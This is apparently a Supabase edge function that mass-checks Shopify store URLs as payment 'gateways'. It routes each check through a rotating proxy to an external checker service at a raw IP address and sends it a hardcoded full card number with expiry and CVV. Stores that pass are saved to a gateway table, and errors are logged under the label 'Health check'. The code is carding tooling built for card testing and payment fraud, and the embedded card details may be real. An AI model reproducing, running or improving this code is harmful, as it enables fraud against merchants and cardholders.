import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

const TEST_CC = "4266841674104656|03|27|908";

const extractPrice = (response: string): { price: number; priceStr: string } => {
  const pricePatterns = [
    /\$[\d,]+\.?\d*/g,
    /USD\s*[\d,]+\.?\d*/gi,
    /"price":\s*"?[\d.]+/gi,
    /"amount":\s*"?[\d.]+/gi,
    /"total":\s*"?[\d.]+/gi,
  ];

  let lowestPrice = Infinity;
  let priceStr = "$0.00";

  for (const pattern of pricePatterns) {
    const matches = response.match(pattern);
    if (matches) {
      for (const match of matches) {
        const numericMatch = match.replace(/[^0-9.]/g, "");
        const value = parseFloat(numericMatch);
        if (!isNaN(value) && value >= 0 && value < lowestPrice) {
          lowestPrice = value;
          priceStr = `$${value.toFixed(2)}`;
        }
      }
    }
  }

  return {
    price: lowestPrice === Infinity ? 0 : lowestPrice,
    priceStr: lowestPrice === Infinity ? "$0.00" : priceStr,
  };
};

const fetchWithRetry = async (url: string, maxRetries = 2, timeoutMs = 45000): Promise<{ ok: boolean; text: string; status: number }> => {
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

      const response = await fetch(url, {
        method: "GET",
        signal: controller.signal,
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          "Accept": "application/json, text/plain, */*",
          "Accept-Language": "en-US,en;q=0.9",
          "Accept-Encoding": "gzip, deflate",
          "Connection": "keep-alive",
          "Cache-Control": "no-cache",
        },
      });

      clearTimeout(timeoutId);
      const text = await response.text();
      return { ok: response.ok, text, status: response.status };
    } catch (err) {
      if (attempt === maxRetries) {
        const msg = err instanceof Error ? err.message : "Unknown fetch error";
        return { ok: false, text: msg, status: 0 };
      }
      // Brief pause before retry
      await new Promise(r => setTimeout(r, 1000 * (attempt + 1)));
    }
  }
  return { ok: false, text: "Max retries exceeded", status: 0 };
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    const token = authHeader.replace("Bearer ", "");
    const { data: { user }, error: authError } = await createClient(SUPABASE_URL, Deno.env.get("SUPABASE_ANON_KEY") || "").auth.getUser(token);
    
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { data: roleData } = await supabase
      .from("user_roles")
      .select("role")
      .eq("user_id", user.id)
      .eq("role", "admin")
      .maybeSingle();

    if (!roleData) {
      return new Response(JSON.stringify({ error: "Admin access required" }), { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { urls, threads = 5 } = await req.json();

    if (!urls || !Array.isArray(urls) || urls.length === 0) {
      return new Response(JSON.stringify({ error: "No URLs provided" }), { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Fetch live proxies
    const { data: liveProxies } = await supabase
      .from("proxies")
      .select("*")
      .eq("status", "live");

    const getProxyStr = (): string => {
      if (!liveProxies || liveProxies.length === 0) return "";
      const randomProxy = liveProxies[Math.floor(Math.random() * liveProxies.length)];
      if (randomProxy.username && randomProxy.password) {
        return `${randomProxy.ip}:${randomProxy.port}:${randomProxy.username}:${randomProxy.password}`;
      }
      return `${randomProxy.ip}:${randomProxy.port}`;
    };

    const concurrency = Math.min(Math.max(threads, 1), 20);
    const results: Array<{ url: string; status: string; price: number; priceStr: string; apiResponse?: string; error?: string }> = [];
    let savedCount = 0;

    const badResponses = [
      "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
      "Site not supported",
      "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
      "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
      "Payment method not available",
      "ARTIFACT_DISSATISFACTION",
      "VALIDATION_CUSTOM",
    ];

    for (let i = 0; i < urls.length; i += concurrency) {
      const batch = urls.slice(i, i + concurrency);
      
      const batchResults = await Promise.allSettled(
        batch.map(async (siteUrl: string) => {
          try {
            const proxyStr = getProxyStr();
            const encodedSite = encodeURIComponent(siteUrl);
            const encodedCC = encodeURIComponent(TEST_CC);
            const encodedProxy = encodeURIComponent(proxyStr);
            const apiUrl = `http://188.137.230.163:5000/shopify?site=${encodedSite}&cc=${encodedCC}&proxy=${encodedProxy}`;
            
            const { ok, text: responseText, status } = await fetchWithRetry(apiUrl, 2, 45000);

            if (!ok || !responseText || responseText.length < 3) {
              return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: responseText || `HTTP ${status} - No response`, error: "No valid response" };
            }

            const { price, priceStr } = extractPrice(responseText);
            const truncatedResponse = responseText.length > 500 ? responseText.substring(0, 500) + "..." : responseText;

            const isBadResponse = badResponses.some(bad => responseText.toLowerCase().includes(bad.toLowerCase()));

            if (isBadResponse) {
              await supabase.from("gateway_urls").delete().eq("url", siteUrl);
              return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: truncatedResponse, error: "Bad response detected" };
            }

            if (price > 0) {
              await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
              return { url: siteUrl, status: "live", price, priceStr, apiResponse: truncatedResponse };
            }

            return { url: siteUrl, status: "dead", price, priceStr, apiResponse: truncatedResponse };
          } catch (error) {
            return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", apiResponse: "", error: error instanceof Error ? error.message : "Unknown error" };
          }
        })
      );

      for (const result of batchResults) {
        if (result.status === "fulfilled") {
          results.push(result.value);
          if (result.value.status === "live") savedCount++;
        } else {
          results.push({ url: "unknown", status: "error", price: 0, priceStr: "$0.00", apiResponse: "", error: "Promise rejected" });
        }
      }
    }

    return new Response(
      JSON.stringify({
        success: true,
        total: urls.length,
        live: savedCount,
        dead: results.filter(r => r.status === "dead").length,
        errors: results.filter(r => r.status === "error").length,
        results,
      }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (error) {
    console.error("Health check error:", error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : "Internal error" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
